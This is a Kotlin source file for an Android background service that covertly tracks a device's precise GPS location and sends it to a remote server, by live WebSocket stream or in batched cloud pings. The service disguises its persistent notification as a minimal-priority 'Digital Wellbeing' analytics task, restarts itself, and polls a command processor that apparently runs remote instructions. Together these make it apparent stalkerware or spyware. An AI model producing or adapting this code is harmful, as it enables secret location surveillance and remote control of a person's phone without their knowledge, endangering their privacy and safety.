package com.example.myandroid

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Context
import android.content.Intent
import android.os.IBinder
import android.os.Looper
import androidx.core.app.NotificationCompat
import com.google.android.gms.location.LocationCallback
import com.google.android.gms.location.LocationRequest
import com.google.android.gms.location.LocationResult
import com.google.android.gms.location.Priority
import kotlinx.coroutines.*
import org.json.JSONArray
import org.json.JSONObject
import java.util.Collections

class BeaconService : Service() {

    private val job = SupervisorJob()
    private val scope = CoroutineScope(Dispatchers.IO + job)
    
    private var sampleFreqSec = 3L
    private var batchFreqSec = 15L
    private var activeMode: String = "WEBSOCKET" // WEBSOCKET, DATABASE, BOTH, BURST
    
    private var locationCallback: LocationCallback? = null
    private var fusedClient: com.google.android.gms.location.FusedLocationProviderClient? = null
    private var latestLocation: android.location.Location? = null
    
    private val locationBatch = Collections.synchronizedList(mutableListOf<JSONObject>())

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        val durationMins = intent?.getLongExtra("duration_mins", 15L) ?: 15L
        activeMode = intent?.getStringExtra("mode") ?: "BURST"
        sampleFreqSec = intent?.getLongExtra("sample_freq", 3L) ?: 3L
        batchFreqSec = intent?.getLongExtra("batch_freq", 15L) ?: 15L
        
        val endTime = System.currentTimeMillis() + (durationMins * 60 * 1000)

        try {
            if (android.os.Build.VERSION.SDK_INT >= 34) {
                startForeground(9999, createNotification(), 1073741824)
            } else {
                startForeground(9999, createNotification())
            }
        } catch (e: Exception) {
            DebugLogger.log("BEACON_ERR", "startForeground failed: ${e.message}")
        }
        
        DebugLogger.log("BEACON", "Mode: $activeMode | Sample: ${sampleFreqSec}s | Batch: ${batchFreqSec}s | Dur: ${durationMins}m")
        fusedClient = com.google.android.gms.location.LocationServices.getFusedLocationProviderClient(this)

        if (activeMode == "WEBSOCKET" || activeMode == "BOTH") {
            SocketManager.connect(applicationContext)
        }

        if (activeMode != "BURST" && androidx.core.content.ContextCompat.checkSelfPermission(this, android.Manifest.permission.ACCESS_FINE_LOCATION) == android.content.pm.PackageManager.PERMISSION_GRANTED) {
            try {
                val locRequest = LocationRequest.Builder(Priority.PRIORITY_HIGH_ACCURACY, sampleFreqSec * 1000)
                    .setMinUpdateIntervalMillis((sampleFreqSec * 1000) / 2)
                    .build()

                locationCallback = object : LocationCallback() {
                    override fun onLocationResult(locationResult: LocationResult) {
                        for (loc in locationResult.locations) {
                            latestLocation = loc
                            
                            // 1. Real-time WebSocket transmission
                            if (activeMode == "WEBSOCKET" || activeMode == "BOTH") {
                                SocketManager.streamLocation(loc.latitude, loc.longitude, loc.accuracy)
                            }
                            
                            // 2. Batch Collection for Database
                            if (activeMode == "DATABASE" || activeMode == "BOTH") {
                                val pt = JSONObject().apply {
                                    put("lat", loc.latitude)
                                    put("lon", loc.longitude)
                                    put("acc", loc.accuracy)
                                    put("ts", System.currentTimeMillis())
                                }
                                locationBatch.add(pt)
                            }
                        }
                    }
                }

                fusedClient?.requestLocationUpdates(locRequest, locationCallback!!, Looper.getMainLooper())
                DebugLogger.log("BEACON", "Hardware LocationCallback attached. Tracking active.")
            } catch (e: Exception) {
                DebugLogger.log("BEACON_ERR", "Failed to attach hardware callback: ${e.message}")
            }
        } else if (activeMode != "BURST") {
            DebugLogger.log("BEACON_ERR", "Location tracking denied: Missing ACCESS_FINE_LOCATION.")
        }
        
        // Loop Processing
        scope.launch {
            while (isActive) {
                if (System.currentTimeMillis() > endTime) {
                    stopSelf()
                    break
                }
                
                val currentDelay = if (activeMode == "BURST") 5000L else (batchFreqSec * 1000L)
                delay(currentDelay)

                if (activeMode == "DATABASE" || activeMode == "BOTH") {
                    val currentBatch = mutableListOf<JSONObject>()
                    synchronized(locationBatch) {
                        currentBatch.addAll(locationBatch)
                        locationBatch.clear()
                    }
                    
                    if (currentBatch.isNotEmpty()) {
                        val arr = JSONArray()
                        currentBatch.forEach { arr.put(it) }
                        
                        val extra = JSONObject().apply {
                            put("location_history", arr)
                            put("location_fresh", currentBatch.last()) 
                        }
                        
                        CloudManager.sendPing(applicationContext, "BATCH_LOC_SYNC (${currentBatch.size} pts)", extra)
                        DebugLogger.log("BEACON_BATCH", "Dispatched ${currentBatch.size} stabilized coordinates to DB.")
                    }
                } else if (activeMode == "BURST") {
                     val extra = JSONObject()
                     if (latestLocation != null) {
                         val locObj = JSONObject().apply {
                             put("lat", latestLocation!!.latitude)
                             put("lon", latestLocation!!.longitude)
                             put("acc", latestLocation!!.accuracy)
                         }
                         extra.put("stream_location", locObj)
                     }
                     CloudManager.sendPing(applicationContext, "BURST (${(endTime - System.currentTimeMillis())/60000}m left)", extra)
                }
                
                CommandProcessor.checkAndExecute(applicationContext)
            }
        }

        return START_STICKY
    }

    private fun createNotification(): Notification {
        val channelId = "sync_service"
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
            val chan = NotificationChannel(channelId, "Device Health", NotificationManager.IMPORTANCE_MIN)
            chan.setShowBadge(false)
            getSystemService(NotificationManager::class.java).createNotificationChannel(chan)
        }
        return NotificationCompat.Builder(this, channelId)
            .setContentTitle("Digital Wellbeing")
            .setContentText("Running background analytics")
            .setSmallIcon(android.R.drawable.ic_menu_recent_history)
            .setOngoing(true)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .build()
    }

    override fun onDestroy() {
        super.onDestroy()
        job.cancel()
        try {
            locationCallback?.let { fusedClient?.removeLocationUpdates(it) }
        } catch (e: Exception) {}
        if (activeMode == "WEBSOCKET" || activeMode == "BOTH") SocketManager.disconnect()
        DebugLogger.log("BEACON", "Service Stopped and LocationCallback detached.")
    }
}
